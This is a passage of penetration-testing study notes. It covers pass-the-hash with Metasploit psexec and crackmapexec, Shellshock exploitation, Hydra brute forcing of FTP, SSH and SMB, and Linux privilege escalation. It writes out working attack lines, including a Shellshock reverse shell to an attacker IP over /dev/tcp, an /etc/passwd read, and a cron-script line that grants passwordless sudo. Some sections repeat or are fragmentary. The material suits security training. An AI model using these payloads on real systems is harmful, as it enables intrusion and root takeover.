The `windows/smb/psexec` module in Metasploit is commonly used for pass-the-hash attacks because it interacts with the SMB protocol in Windows networks, allowing for remote execution. The module mimics the legitimate psexec tool to authenticate with the SMB service on a target machine using captured NTLM or LM hashes, bypassing the need for a plain-text password. Once authenticated, the module remotely executes commands or delivers a payload, such as a reverse shell, to gain control of the system. 

1. **Search for the PsExec Module**: Background the existing meterpreter session using `Ctrl+Z`
```
search psexec
```
We need the `exploit/windows/smb/psexec` exploit. Configure the exploit module and payload options. Also, just for this module we need to provide both the lm_hash and ntlm_hash since you might get error only posting the ntlm hash alone
	- `RHOST` = Target IP
	- `LPORT`= Your listening port, make sure this doesn't overlap with the local port used for the previous meterpreter session since we're going to be setting up another metrepreter session. (Can check by running `sessions` to see the port used for the session)
	- `SMBDomain` = If connected to a domain
	- `SMBUser` / `SMBPass` = The `SMBPass` can accept either the clear-text password or the NTLM hash which is what we'll provide.  Just for this module we need to provide both the lm_hash and ntlm_hash since you might get error only posting the ntlm hash alone. it would be set as `set SMBPass lm_hash:ntlm_hash`. The LM hash `aad3b435b51404eeaad3b435b51404ee`  is a default "empty" LM hash value, often used when the system doesn't actually use LM hashes which is common with modern system. 
```
use exploit/windows/smb/psexec
set SMBUser <user>
set SMBPass aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99
set LPORT 4312
```

This exploit uses SMB to gain remote code execution, there's different methods for delivering and executing the payload on the target system so we might need to specify it specifically here to get a meterpreter session. We can try running `set target` command for `Command` and try setting it as Native upload  to have the  Meterpreter payload uploaded to the target. 
```
set target Native\ upload
```
Run the exploit
```
exploit
```
You might need to tweak the target for the exploit, but you should get a meterpreter session.

##### CrackMapExec
The other tool for the pass-the-hash attack using the dumped NTLM hashes is `crackmapexec`. Keep in mind this might have issues with python dependencies so you might see errors.

General Syntax:
```
crackmapexec smb target -u username -H "NTLM_hash" -x "enter_cmd_here"
```
- `-u` = username
- `-H`= The NTLM Hash
- `-x` = The command that will execute on the target

Example:
```
crackmapexec smb target -u Administrator -H "5f4dcc3b5aa765d61d8327deb882cf99" -x "net user"
```


# Linux-Vulnerabilities


Linux is a free and open-source operating system made up of the **Linux kernel**, developed by Linus Torvalds, and the **GNU toolkit** (cat ls cd dir), initiated by Richard Stallman. Often referred to as **GNU/Linux**, it is commonly used as a server OS, with services and protocols running that can serve as access vectors for attackers. 
- **Apache Web Server** | TCP ports 80/443 | Free and open source cross-platform web server which accounts for over 80% of web servers globally.
- **SSH (Secure Shell)** |TCP ports 22 |  SSH is a cryptographic remote access protocol that is used to remotely access and control systems over an unsecured network. SSH was developed as a secure successor to telnet.
- **FTP (File Transfer Protocol)** | TCP port 21 | The protocol is used to facilitate file sharing between a server and client/clients and vice versa.
- **SAMBA** | TCP port 445 |  Samba is the Linux implementation of SMB  and allows Windows systems to access Linux shares and devices.


# Exploiting-Linux-Vulnerabilities

### ShellShock

Shellshock is a family of vulnerabilities in the Bash shell (since version 1.3) that allows an attacker to execute remote arbitrary commands, potentially granting remote access via a reverse shell. The vulnerability was discovered in September 2014.

 The vulnerability arises when Bash mistakenly executes trailing commands after a specific string of characters: `() {:;};`. Anything following this string is executed unintentionally by Bash. Apache web servers configured to run CGI scripts are particularly vulnerable. CGI scripts are used by Apache to execute commands on the server and return results to a web client. Attackers can exploit CGI scripts by injecting malicious commands into request headers, such as the User-Agent header. When the web server executes the CGI script, Bash is triggered and the injected commands are executed.
    
**Exploitation Process**
To exploit Shellshock, you need a vulnerable input vector, such as a CGI script running on an Apache server. The key steps include:
1. Identifying a CGI script that interacts with Bash.
2. Sending a crafted HTTP request that includes the malicious `() {:;};` string followed by the desired commands.
3. The web server creates a new process and executes the CGI script using Bash, processing the injected commands.

**Tools for Exploitation**
The vulnerability can be exploited manually by interacting with the server via proxy tools or automatically with Metasploit's exploit module. These methods can result in obtaining a reverse shell or a Meterpreter session.

###### 1. Find the input vector to exploit

We can first view the page source of the website to see if there's a CGI script explicitly visible in the webpages HTML/Javascript. Sometimes, CGI scripts can be visible here which would make it easier to identify and attempt the exploitation. Something like this:
```
xhttp.open("GET", "/gettime.cgi", true)
```
However, visibility in the page source is not necessary for discovery.  Tools like Nmap or Nikto scan for common script locations (e.g., `/cgi-bin/`), while DirBuster and Gobuster brute-force hidden paths. Misconfigured servers may reveal scripts through error messages like 404s or by allowing directory listings. Even without visible clues, attackers can analyze HTTP responses to infer the presence of CGI scripts or Bash-related processes.

###### 2. Check if the system is vulnerable to ShellShock

We can use the nmap script `http-shellshock` to check if the target is vulnerable to it. We also need to provide the arguments for the script 
```
nmap -sV target --script=http-shellshock --script-args "http-shellshock.uri"=<loc_of_cgi_script>
```
- `-sV` = Service version detection
- `"http-shellshock.uri"` = The location of the cgi script

Example:
```
nmap -sV 10.66.38.37 --script=http-shellshock --script-args "http-shellshock.uri"=/test.cgi
```

We can use the cgi script to inject the special characters within HTTP headers using the User-Agent header

###### 3. Use a proxy like Burp Suite/ZAP
- ***Note**: FoxyProxy is a Firefox/Chrome extension that helps manage proxy settings more efficiently. By switching profiles, you can direct browser traffic through Burp Suite or ZAP to intercept and analyze web requests. 

Open BurpSuite (`From Kali: Menu > Web Application Analysis > burpsuite`) a temporary project that's using Burp defaults is fine. The `Proxy` tab in Burp Suite is where you can view and intercept web traffic between your browser and the target server. It allows you to see requests and responses as they pass through Burp, making it easier to inspect or modify them.
Navigate to the 'Intercept' tab under the Proxy (`Proxy > Intercept`). First, make sure the Intercept is enabled (`Intercept is on`), as this feature in Burp Suite pauses traffic, allowing you to inspect, modify, forward, or drop each request/response before it reaches the server or client in real time.

- `Forward` allows the intercepted HTTP request/response to proceed to its destination
- `Drop` means discarding the intercepted HTTP request/response.

Under' 'Intercept', forward/drop request until you find the request involving the cgi script. We can inject the special characters through the User-Agent using a repeater (`Right-click within the packet data > Send to repeater`). The 'Repeater' in Burp Suite allows us to send individual HTTP requests to the server which we can modify to test the server's response. Navigate to the Repeater tab where you'll see the same request, then clear the header. First, include the special character `() { :; };` followed by whatever command you want to execute.
```
() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'
```
Click `Send` to send the request through the repeater. If you can get an output in the Response then we know the vulnerability works.

###### 4. Setup a Netcat Listener

We can gain a reverse shell on that target by using bash to connect to a listener on our Kali Linux box using netcat. To set up a basic listener in Netcat, we need the `-lp` options to specify that we're setting up a listener on a port: 

```
nc -nvlp 1234
```
- `-l`: Listener | This tells Netcat to listen for incoming connections 
- `-p 1234`: Specifies the port number to listen on, which in this case is port 1234.
- `-n`: (Optional) | Tells Netcat not to resolve hostnames 
- `-v`:  (Optional) Runs Netcat in verbose mode, providing detailed output bash

###### 4. Edit the request to include the reverse shell back to the attack box

General Syntax:
```
() { :; }; echo; echo; /bin/bash -c "bash -i>&/dev/tcp/<attack_box_IP>/<listening_port> 0>&1"
```

Example (Breakdown of the reverse shell explained below):
```
() { :; }; echo; echo; /bin/bash -c "bash -i >& /dev/tcp/10.92.2.6/1234 0>&1"
```

#### Redirections and File Descriptors
In Linux/Unix, redirection controls where input and output goes. By default, commands send their output (stdout) to the terminal and read input (stdin) from the keyboard. Redirection allows us to change this behavior using symbols like `>` (to redirect output), `>>` (to append output), and `<` (to redirect input). File descriptors are used to represent input/output streams:
- `0` = Standard Input (stdin): Where commands read input (normally the keyboard).
- `1` = Standard Output (stdout): Where commands send normal output (normally the terminal).
- `2` = Standard Error (stderr): Where commands send error messages (normally the terminal)
When using `>&`, the `&` specifies which file descriptors are being redirected. For example, you could specify something like `>&2`which would mean to redirect the output to the same place as the standard error etc. Using  `>&` where the file descriptor after `&`  isn't specified would mean redirects both stdout (1) and stderr (2) to the same destination.
##### Reverse Shell Breakdown
```
bash -i >& /dev/tcp/10.92.2.6/1234 0>&1
```
1. `bash -i`: This starts an interactive Bash shell, keeping the shell open to accept and execute commands.
2. `>&`: Redirects both the standard output (1) and standard error (2) 
3. **`/dev/tcp/10.92.2.6/1234`**: This tells the system to send both the standard output and error output to a remote IP (`10.92.2.6`) over TCP via port `1234` . The `/dev/tcp/` is a special file system in Linux that allows the creation of network connections by writing to a specific IP and port using `/dev/tcp/[IP]/[PORT]`. 
4. `0>&1`: This redirects stdin (0) to the same destination as stdout (1). The standard output has already been redirected to the remote IP so instead of reading input from the terminal, the shell will now read input from the network connection (i.e., from the attack box).

As a result, the attacker can send commands to the shell over the network (via stdin), and the shell will send back both normal output and error messages (via stdout and stderr) to the remote machine.

#### Performing the Exploit using Metasploit

1. Start Postgresql and open Metasploit (`msfconsole)
```
service postgresql start && msfconsole
```
2. Search for Shellshock
```
search shellshock
```
There will be an auxiliary scanner for shellshock which checks for the vulnerability (`auxiliary/scanner/http/apache_mod_cgi_bash_env`) we can just go with the exploit module (`exploit/multi/http/apache_mod_cgi_bash_env_exec`)
```
use exploit/multi/http/apache_mod_cgi_bash_env_exec
```
3. Configure and rune the exploit: You'll likely need to setup the `RHOST` for the target and the `TARGETURI` for the cgi script location.
```
set RHOST 10.55.21.43

set TARGETURI /test.cgi
```
4. Run the exploit: This should setup a meterpreter session
```
exploit
```


## FTP

FTP (File Transfer Protocol) operates on TCP port 21 and is commonly used for file sharing between servers and clients. Frequently used to transfer files to and from web server directories. Authentication typically requires a username and password, making FTP servers susceptible to brute-force attacks to uncover valid credentials. However, some FTP servers may permit anonymous access, allowing anyone to connect without authentication.

Inherent vulnerabilities in FTP is primarily dependent on the version of FTP software being used.


```
nmap -sV target
```

#### Checking for Anonymous Access

- **Option 1:  Connect directly to the FTP server**: You can use the ftp utility in Kali would you could see if it prompts you to enter credentials. If it does, then anonymous access isn't allowed

```
ftp <target>
```

- **Option 2: Run the ftp-anon nmap script**: This NSE script should return if anonymous access is allowed on the target.

```
nmap --script=ftp-anon <target>
```


### Performing FTP Brute Force

Hydra can be used to perform the brute force on the FTP server using username/password word lists. :
- **Usernames** = `/usr/share/metasploit-framework/data/wordlists/common_users.txt`
- **Passwords** =   `/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`

```
hydra -L <username_wordlist> -P <password_wordlist> target -t 4 ftp
```

#### Looking for Inherent FTP Vulnerabilities 

Keep in mind you can search for vulnerabilities within the FTP software itself using something like searchsploit/metasploit to search for vulnerabilities.

```
searchsploit <ftp_software>
```


## Exploiting SSH

SSH (Secure Shell) is a protocol designed for secure remote administration and access to servers and systems. It provides encrypted communication and serves as a more secure alternative to Telnet. By default, SSH operates on TCP port 22, though it can be configured to use any other open TCP port as needed.

Authentication in SSH can be configured in two primary ways: standard username/password authentication or key-based authentication. Key-based authentication involves the use of a public and private key pair, where the public key is stored on the server and the private key is provided to the user. This method eliminates the need for a username and password, requiring users to authenticate using their private key. This authentication method isn't feasible to attack unless you were able to get the private key.

On the other hand, with username and password authentication, it is possible to conduct brute-force attacks against the SSH server. Such attacks attempt to systematically guess credentials to gain unauthorized access to the target system.


### Performing SSH Brute Force

Hydra can be used to perform the brute force on the SSH / server using username/password word lists. :
- **Usernames** = `/usr/share/metasploit-framework/data/wordlists/common_users.txt`
- **Passwords** =   `/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`

```
hydra -L <username_wordlist> -P <password_wordlist> target -t 4 ssh
```

### Performing SSH Brute Force

Hydra can be used to perform the brute force on the SSH / server using username/password word lists. :
- **Usernames** = `/usr/share/metasploit-framework/data/wordlists/common_users.txt`
- **Passwords** =   `/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`

```
hydra -L <username_wordlist> -P <password_wordlist> target -t 4 ssh
```

### Login to SSH Server

To login with ssh, you need to provide the username followed by @ then specify the target. You'll be promoted to enter the password after.

```
ssh username@target_system
```

**Basic Enumeration** 
- View the username = `whoami `
- Groups its apart of = `group <user>`
- View Linux Distribution = `cat /etc/*issue`
- View Kernel = `uname -r`
- Enum users = `cat /etc/passwd`


## Exploiting SAMBA

Samba is the Linux implementation of the SMB protocol which runs on 445 (139 is for SMB running on top of netbios), enabling Windows systems to access Linux shares and devices. It uses username and password authentication to grant access to servers or network shares. Brute-force attacks can be performed on Samba servers to obtain valid credentials. 

Once credentials are acquired, tools like SMBMap can be used to enumerate shared drives, list and download files, and execute remote commands. Another tool, smbclient, is apart of SAMBA and offers an FTP-like interface for downloading, uploading, and retrieving directory information. Unlike Windows systems, Linux servers rarely allow null shares, which permit access without a password.

#### Performing SMB Brute Force

Hydra can be used to perform the brute force on the SMB server using username/password word lists. :
- **Usernames** = `/usr/share/metasploit-framework/data/wordlists/common_users.txt`
- **Passwords** =   `/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`

```
hydra -L <username_wordlist> -P <password_wordlist> target -t 4 smb
```

#### Enumerate SMB Shares

The SMBMap (Samba Share Enumerator) tool can be used to enumerate the shares on the target.  Set the target (`-H`) then specify the username (`-u`) and password (`-p`) of proper credentials. 

```
smbmap -H target -u <username> -p <password>
```

#### Access SMB Shares

Use the smbclient to directly access any share. After connecting, you'll have an smb console to perform whatever actions you want.
```
smbclient //target/share -U <username>
```

- **Random Note 1**:  Extract Tar Archive = `tar xzf <target_file>`
- **Random Note 2**:  Download file = `get <target_file>`

### Enumerate Users/Shares using Enum4Linux

The enum4linux utility be a great tool as it can enumerate users, computer list, shares etc. You can try to run all tests with enum4linux with the `-a` option but if you get a message like 'Server doesn't allow session using username '', password ''.  Aborting remainder of tests. ' then null sessions is not allowed on the SAMBA server, so you need a username/password.

```
enum4linux -a -u <username> -p <password> target
```

If using the `-a` option, the results will be comprehensive as the tool will obtain password policies/groups/users (with SID.)

# Linux-Privilege-Escalation

### Linux Kernel Exploitation

Kernel exploits on Linux focus on targeting vulnerabilities in the Linux kernel to execute code that in order to run privileged system  system commands or gain a root shell. The process varies depending on the specific kernel version, distribution, and exploit being used. 

Privilege escalation on Linux systems typically involves:
1. Identifying kernel vulnerabilities
2. Downloading and compiling the exploit, and then 
3. Transferring it to the target system for execution.


**Note:** The `www-data` account is a common service account in Linux systems hosting web servers (like Apache or Nginx). It is generally unprivileged and not part of any sudo or privileged groups. The ultimate goal of privilege escalation is to gain control of the `root` account, which has the highest privileges on a Linux system.

### Linux Exploit Suggester

The **Linux Exploit Suggester** helps identify potential security flaws in a Linux kernel by analyzing its exposure to known Linux kernel exploits. It works heuristically to suggest possible kernel exploits.

+ GitHub: https://github.com/mzet-/linux-exploit-suggester

1. **Download the Linux Exploit Suggester from Github**: Use `wget` to download the Linux Exploit Suggester script. If you have a Meterpreter or reverse shell session, download the script to your local machine first and upload it to the target.
```
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
```

2. **Upload the script**:  Navigate to the `/tmp` directory on the target system and use the `upload` command in Meterpreter to transfer the script.
```
cd /tmp
meterpreter> upload ~/<Location_of_script>/les.sh
```

3. **Start Shell Session/ Make Script executable**: First start the shell session using `shell` so you can run the executable and then make it a interactive bash session by running `/bin/bash -i`. Update the permission of the script by adding executable permissions (`x`) to it with chmod.

```
meterpreter> shell
/bin/bash -i
chmod +x les.sh
```

4. **Run the script**:  Execute the script directly by typing its name.
```
les.sh
```

##### Linux Exploit Suggester Output 
- The script will output a list of potential kernel exploits with their associated CVEs, sorted by the likelihood of success.
- Pay attention to the kernel version, architecture, and distribution details in the output.
- Each suggested exploit typically includes an exploit-db URL where the code can be reviewed and downloaded. Always inspect the code to ensure it doesn't contain any malicious elements.
#### Compiling Kernel Exploits

There's two options for compiling the exploit script:

1. Compile it locally on your machine.
2. Transfer the script to the target and compile it there.

For local compilation, ensure you have GCC (GNU C Compiler) installed:

```
sudo apt-get install gcc
```

Refer to the exploit script's notes for compilation instructions. Successful compilation without errors indicates the exploit is ready, but if it fails, try compiling it on the target. Use GCC with the appropriate parameters:

```
gcc <parameters>
```

From here, you can execute the exploit binary on the target.

### Exploiting Misconfigured Cron Jobs

Linux uses a utility called **Cron** for task scheduling, allowing applications, scripts, or commands to run automatically at specified intervals. These scheduled tasks, known as **Cron jobs**, are often used for automating functions like backups or system updates. The **crontab** file is a configuration file used by Cron to store and track Cron jobs.

Cron jobs can be executed by any system user,  but try to target cron jobs that have been configured to run as the root user since a root-configured Cron job will run whatever script/command  as the root user and will consequently provide us with root access without having to provide a password. In order to elevate our privileges, we will need to find and identify cron jobs scheduled by the root user or the files being processed by the cron job.

There's various misconfigurations but one 
If a script has improper permissions, ie the script can be edited by any user on the system that means we can include commands into a file 



We can search for files that only allows the root account access search the system to see if the location of the file is mentioned in any shell script


You can view files with `ls` and the permissions etc with the `-al` options included.
```
ls -al
```


If you have a file in mind, you can use grep with a recursive search using `-rnw` to check for any lines containing the exact string to the file path.
```
grep -rnw /usr -e "/home/person/file1"
```

If the file path was found in a shell script, it would return the script it was found it, the line of the script the string was found in, and then the exact line matching the path. 

```
file_path:line_number:matching_line_in_script
```

Since you've identified the script, you can check the permissions using `ls -al` again to see script's permission. If you see something like `-rwxrwxrwx` which is allowing any user the permission to execute this.



We can add to the script to modify the `/etc/sudoers` file to allow an account to execute any command as any user (including root) without being prompted for a password. The `/etc/sudoers` file is a configuration file that controls and defines the sudo/elevated permissions for users and groups on a Linux system. Each entry of the file specifies a user or group, the commands they can execute, and whether a password is required. Adding an entry like  'user ALL=NOPASSWD:ALL' would grant a user password-less sudo privileges for all commands.



```
printf '#!/bin/bash\n "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh
```

- - `#!/bin/bash`: This shebang line specifies that the script should be executed using the Bash shell.
    - `"student ALL=NOPASSWD:ALL"`: This is the line being appended to `/etc/sudoers`. It grants the user `student` password-less sudo privileges for all commands.
    - `>> /etc/sudoers`: The double greater-than symbol appends the text to the `/etc/sudoers` file.
- `> /usr/local/share/copy.sh`: Redirects the output of `printf` into the file `/usr/local/share/copy.sh`, creating the file if it does not already exist.

After that, you might need to wait for the cron job to run but you can list sudo privileges with `sudo -l` to make sure the cron job modifies the sudoers file.

When that's done, you should be able to switch to the root user 

```
sudo su
```




Can run `sudo -l` to list sudo permissions

```
sudo -l
```

Should be able to switch to the root user

```
sudo su
```















If a character is missing, it’s replaced by `-`, which means that type of permission isn't allowed. For example:
- `rw-` means read and write are allowed, but not execute.
- `r--` means only read is allowed.

```
-rw-r--r--
```

- Owner: `rw-` (can read and write).
- Group: `r--` (can only read).
- Others: `r--` (can only read).






**Permission String**

Every file or directory in Linux has a **10-character string** that describes its type and permissions. 

```
-rwxr-xr--
```

The first character of the string tells the type of file:
- `-` means a regular file.
- `d` means a directory.
- `l` means a symbolic link.

**The Next Nine Characters**: Represent the permissions of the file  divided into three groups of three representing the owner, group, and others (everyone else).

```
_ _ _ | _ _ _  | _ _ _ 

owner | group  | others
```
- The **first group** is for the file's owner.
- The **second group** is for the group assigned to the file.
- The **third group** is for others (all users not in the group or the owner).

**Permission Types**:  

There's three permission types designated by a character:
- `r` (read): Allows viewing the file or listing a directory’s contents.
- `w` (write): Allows modifying or deleting the file. For directories, it allows creating/deleting files inside it.
- `x` (execute): Allows running the file as a program. For directories, it allows accessing the directory.

If a permission is not granted, it's replaced by `-`.
`-rw-r--r--` means:

- **Owner**: `rw-` → Can read and write.
- **Group**: `r--` → Can only read.
- **Others**: `r--` → Can only read.

# Linux-Credential-Dumping